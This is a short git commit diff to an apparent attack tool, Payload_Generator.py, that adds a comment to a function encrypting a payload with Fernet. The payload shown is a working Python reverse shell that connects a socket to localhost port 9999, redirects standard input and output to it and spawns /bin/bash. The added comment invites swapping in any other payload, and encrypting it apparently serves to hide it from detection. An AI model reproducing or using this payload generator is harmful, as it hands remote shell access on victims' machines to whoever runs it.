cf22267cf40fca1074664089aa1e1c81b6904e4e
The-Kernel-Panic <68448806+The-Kernel-Panic@users.noreply.github.com>
2021-01-26 04:02:12 +0530

    Added a comment for the payload

--- Payload_Generator.py
+++ Payload_Generator.py
@@ -5,6 +5,7 @@ cipher_suite = Fernet(key)
 
 #Creating the encrypted payload
 def encrypted_payload_creator():
+    #Change the payload_to_be_encrypted to the payload you want (Currently its a reverse shell to localhost)
     payload_to_be_encrypted = 's=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("localhost",9999));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/bash")'
     encrypted_payload = cipher_suite.encrypt(payload_to_be_encrypted)
     return encrypted_payload
